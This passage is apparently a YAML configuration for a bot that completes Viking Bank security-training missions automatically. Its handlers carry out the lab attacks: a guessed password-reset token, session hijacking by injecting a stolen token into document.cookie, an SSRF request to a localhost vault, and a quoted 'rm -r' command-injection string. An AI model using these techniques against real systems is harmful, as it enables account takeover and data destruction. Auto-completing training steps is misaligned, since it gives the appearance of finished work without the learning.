      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'profile/resetpassword?email=admin@vikingbank.example&token={token}', enter: true, settle: 3 }

  # Step 8 "Change the admin password": on the reset form (reached by the guessed token),
  # set both fields to our fixed new password and submit. login-admin-new-password then
  # logs in with the same value.
  - id: change-admin-password
    match:
      title_regex: '(?i)^change the admin password'
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Password', value: 'NewP@ssw0rd1!' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#ConfirmPassword', value: 'NewP@ssw0rd1!' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#reset-password-btn-submit', settle: 3 }

  # View a payment receipt (Broken Auth / "Exposed Session Tokens" mission, step
  # "View a receipt"). Under received invoices the paid ones expose a "RECEIPT" link
  # (`#receipt-btn`, an <a> in the app frame [0,0,0]) whose href leaks the session
  # token in a `?session=` query param — the very flaw the mission teaches. Clicking
  # it navigates to the detailed receipt and ticks the step. Confirmed LIVE.
  - id: view-receipt
    match:
      title_regex: '(?i)^view a receipt'
    do:
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#receipt-btn', settle: 3 }

  # Send a payment reminder to a debtor (Broken Auth / "Exposed Session Tokens"
  # mission, step "Send a reminder"). The debtor's account number is the
  # parenthesized number in the copy ("Bobby's (999999)"). Sequence, all in the app
  # frame [0,0,0], confirmed LIVE: go to the sent-invoices list (via the browserBar
  # in [0,0]); click "View" on the row that contains that account number — note the
  # link's raw DOM text is "View", NOT the CSS-uppercased "VIEW" the page shows (see
  # README's XPath gotcha); click `#reminder-btn` (opens a `#modal`); confirm with
  # `#confirm-reminder` ("YES" → /sendreminder), which ticks the step and triggers
  # the debtor's auto-reply email. LIMITATION: assumes an unpaid invoice to that
  # account already exists; the step's "else create one" fallback isn't handled.
  - id: send-reminder
    match:
      title_regex: '(?i)^send a reminder'
    extract:
      account: { from: description, regex: '\((\d+)\)' }
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'invoices', enter: true, settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "//tr[contains(., '{account}')]//a[normalize-space(.)='View']", settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#reminder-btn', settle: 2 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#confirm-reminder', settle: 3 }

  # Check the debtor's reply email (Broken Auth / "Exposed Session Tokens" mission,
  # step "Check Bobby's answer"). The reminder triggered an auto-reply in which the
  # debtor naively links to his OWN receipt — whose URL leaks his session token.
  # Sequence, confirmed LIVE, all in the mission-player chrome frame [0,0]: switch to
  # the Email Client tab (`#browser-tab-EMAIL_CLIENT`); open the reply (the inbox row
  # button, subject "Proof of Payment"); click its "link to receipt" <a>. That opens
  # a Forbidden error page (the receipt is the debtor's, not ours) whose URL carries
  # his `?session=` token — which the next step steals. Just opening it ticks the step.
  - id: check-answer
    match:
      title_regex: '(?i)^check .* answer'
    do:
      - ui: { action: click, frame: [0, 0], by: css,   selector: '#browser-tab-EMAIL_CLIENT', settle: 3 }
      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//button[contains(., 'Proof of Payment')]", settle: 2 }
      - ui: { action: click, frame: [0, 0], by: xpath, selector: "//a[contains(normalize-space(.), 'link to receipt')]", settle: 3 }

  # Hijack the debtor's session (Broken Auth / "Exposed Session Tokens" mission, step
  # "Take over Bobby's session") — the payoff, and the first handler to (a) read a
  # value from the LIVE page rather than the step text and (b) use an `eval` action.
  # After `check-answer`, the mission browser's URL bar (`#browserBar` in frame [0,0])
  # holds the debtor's receipt URL with his `?session=<token>`; the `context` block
  # scrapes that token via an eval in that frame.
  #
  # The instructions say to paste it into the on-screen cookie editor and SET COOKIE,
  # but that editor is a React-controlled input: a Selenium-typed value never reaches
  # its state, so SET COOKIE silently re-saves the OLD cookie (verified LIVE — the
  # app cookie stayed Alice's). The VikingBankSessionId cookie is NOT HttpOnly, so we
  # instead write it straight into the app frame [0,0,0] with an `eval` action, then
  # navigate to /Home (browserBar auto-prepends "/", so type the bare "Home"). The
  # pod verifies the session, not the editor UI: this ticks the step and completes the
  # mission ("Congratulations!" results panel). Confirmed LIVE end-to-end.
  - id: take-over-session
    match:
      title_regex: '(?i)^take over'
    context:
      token:
        frame: "0/0"
        # Tolerate both `session=<tok>` (the intended error page, logged in) and the
        # URL-encoded `session%3D<tok>` (if the app bounced to a login redirect first).
        eval: "return document.querySelector('#browserBar').value.match(/session(?:=|%3D)([^&]+)/)[1]"
    do:
      - eval: { frame: "0/0/0", script: "document.cookie='VikingBankSessionId={token}; path=/'" }
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'Home', enter: true, settle: 4 }

  # Transfer money (vb-52 step 5, "Transfer money from Bob to Alice"). Selectors,
  # frame [0,0,0], and the required-Description quirk were all confirmed LIVE: the
  # form silently re-renders "Please enter a description" and does NOT tick the
  # step unless Description is filled. The destination account is the backtick-
  # quoted number in the copy ("Alice's account (`94923054`)"); the amount and
  # description are arbitrary ("for any amount"), so they're fixed throwaways.
  - id: transfer-money
    match:
      title_regex: '(?i)^transfer'
    extract:
      dest: { from: description, regex: '`(\d+)`' }
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#DestinationAccountNumber', value: '{dest}' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Amount', value: '100' }
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Description', value: 'repayment' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#transfer-btn-submit', settle: 3 }

  # --- Broken Access Control / SSRF "download fallback" mission (vb-56) ---------
  # Reach a localhost-only /vault by abusing the statement-download endpoint's fallback:
  #   /statements/download/{id}?fallbackUrl={url}
  # fetches {url} SERVER-SIDE when {id} doesn't exist (the "fallback"), and {url} is
  # attacker-controlled → SSRF. 8 instructions (order 0-7); order 2 "Inspect the vault
  # code" and order 5 "Inspect the URL" are informational (no checkbox → skipped). order 0
  # "Log in as Alice" is handled by `login-as`, order 1 "Try to access the vault" by
  # `navigate-endpoint` (nav /`vault` — the "add" alternative in its regex). The four
  # below cover the rest. Solved + validated LIVE end-to-end 2026-07-13 (mission
  # "Congratulations!" panel; every instr-check confirmed ticked as each step ran).

  # order 3 "View a statement": open the E-Statements list, then a statement's detail.
  # The list's "View statement" links are <a href="/statements/{id}"> in the app frame
  # [0,0,0]; the menu link is the bare /statements (no trailing slash, excluded) and the
  # download links contain 'download' (excluded). Opening a detail ticks the step.
  - id: view-statement
    match:
      title_regex: '(?i)^view a statement'
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'statements', enter: true, settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[starts-with(@href,'/statements/') and not(contains(@href,'download'))])[1]", settle: 3 }

  # order 4 "Download a statement": on a statement detail, click the DOWNLOAD STATEMENT
  # link (`#download-statement-link`, whose href IS the vulnerable
  # /statements/download/{id}?fallbackUrl=… endpoint). Self-contained (re-opens a
  # statement first) so it also works as a resume entry point — the download click
  # navigates away, so a later step can't assume the detail is still showing.
  - id: download-statement
    match:
      title_regex: '(?i)^download a statement'
    do:
      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'statements', enter: true, settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[starts-with(@href,'/statements/') and not(contains(@href,'download'))])[1]", settle: 3 }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#download-statement-link', settle: 3 }

  # order 6 "Trigger the fallback": prove the fallback by requesting a NON-EXISTENT
  # statementId (999) with the ORIGINAL fallbackUrl — the getlatest-transactions API on
  # the app's own host — so the server, unable to find statement 999, fetches fallbackUrl
  # and returns "the latest transaction" file. The fallbackUrl is built LIVE from the app
  # frame's own `location.origin` (the host is per-session/pod) + Alice's fixed account
  # 94923054, URL-encoded exactly as the page's own link encodes it, then navigated via
  # the mission chrome #browserBar (frame [0,0], which auto-prepends "/" and pre-fills the
  # app host). NOTE: 94923054 is Alice's account (see transfer-money); if SCW ever rotates
  # it, the getlatest fetch 404s and the step won't tick — re-derive from a live
  # #download-statement-link href.
  - id: trigger-fallback
    match:
      title_regex: '(?i)^trigger the fallback'
    context:
      fb:
        frame: "0/0/0"
        eval: "return encodeURIComponent(location.origin + '/api/transactions/getlatest/94923054')"
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'statements/download/999?fallbackUrl={fb}', enter: true, settle: 4 }

  # order 7 "Break into the vault" — the SSRF payoff. Same non-existent statementId 999,
  # but point fallbackUrl at the localhost-only vault `http://localhost:5000/vault`: the
  # server fetches it server-side, so the request now ORIGINATES from localhost — the
  # trusted source the vault's access control checks — and the vault contents come back,
  # completing the mission. Host-independent (localhost is the app's own box), so it's a
  # FIXED nav; URL-encoded so the #browserBar doesn't mangle the `://`.
  - id: break-into-vault
    match:
      title_regex: '(?i)^break into the vault'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'statements/download/999?fallbackUrl=http%3A%2F%2Flocalhost%3A5000%2Fvault', enter: true, settle: 4 }

  # --- Insufficient logging / monitoring investigation mission (vb-50) -----------
  # "web.insufficient_logging.generic": the logs DO capture an attacker's command-
  # injection attempt, but you must investigate to find and act on it. 7 instructions
  # (order 0-6); order 3 "Copy the suspicious log" is informational (no checkbox → the
  # loop skips it). order 0 "Log in as admin" is handled by `login-as` (email + password
  # in backticks). The five below cover the rest. Solved + validated LIVE end-to-end
  # 2026-07-13 (every instr-check ticked; mission "complete" panel reached).
  # NOTE: the two nav steps name their endpoint in markdown BOLD (/__logs__, /__users__),
  # NOT backticks, so `navigate-endpoint` doesn't claim them — hence these title-keyed
  # handlers. The suspect's Id and the log-evidence text are re-derived LIVE (a same-origin
  # XHR to the /logs search from the app frame), so they survive per-instance data changes.

  # order 1 "View the monitoring page": nav the #browserBar to /logs (the monitoring page).
  - id: view-monitoring-page
    match:
      title_regex: '(?i)^view the monitoring page'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'logs', enter: true, settle: 3 }

  # order 2 "Search for frequently used OS commands": type a common command into the logs
  # SearchTerm box and submit — surfaces the injection log ("... tried to use invalid
  # filename 'cd ../.. && rm -r ./* && mkdir pwned'"). `rm` is one of the commands the copy
  # suggests and hit live; the search + fields are in the app frame [0,0,0].
  - id: search-os-commands
    match:
      title_regex: '(?i)^search for frequently used'
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#SearchTerm', value: 'rm' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#submit', settle: 2 }

  # order 4 "View the users page": nav the #browserBar to /users.
  - id: view-users-page-logging
    match:
      title_regex: '(?i)^view the users page'
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users', enter: true, settle: 3 }

  # order 5 "View the user details of the suspect": the suspect's Id is the one named in the
  # injection log. Re-derive it LIVE — a same-origin sync XHR to the /logs search from the app
  # frame [0,0,0], regexing the Id out of the "Id <n> tried to use invalid filename" entry —
  # then nav the #browserBar to /users/<id> (which ticks the step, same as clicking its View).
  - id: view-suspect-details
    match:
      title_regex: '(?i)^view the user details of the suspect'
    context:
      id:
        frame: "0/0/0"
        eval: >-
          var x=new XMLHttpRequest();x.open('GET','/logs?SearchTerm=filename',false);x.send();
          return (x.responseText.match(/Id (\d+) tried to use invalid filename/)||[])[1]||'';
    do:
      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users/{id}', enter: true, settle: 3 }

  # order 6 "Block the attacker": on the suspect's detail page, paste the log evidence into
  # the "Enter Log Evidence" field and click Block User. The evidence is the full suspicious
  # log LINE, re-derived LIVE the same way (XHR to /logs search, then the injection entry's
  # <p> textContent — which decodes the &#x27;/&amp; entities back to '/& and joins the
  # timestamp/level/message spans). The pod accepted this exact line live. Both controls are
  # in the app frame [0,0,0].
  - id: block-the-attacker
    match:
      title_regex: '(?i)^block the attacker'
    context:
      evidence:
        frame: "0/0/0"
        eval: >-
          var x=new XMLHttpRequest();x.open('GET','/logs?SearchTerm=filename',false);x.send();
          var d=document.createElement('div');d.innerHTML=x.responseText;
          var sp=[...d.querySelectorAll('span')].filter(function(e){return /invalid filename/.test(e.textContent)})[0];
          return sp? sp.closest('p').textContent.trim().replace(/\s+/g,' ') : '';
    do:
      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#log-evidence-input', value: '{evidence}' }
      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#block-user-btn-submit', settle: 4 }
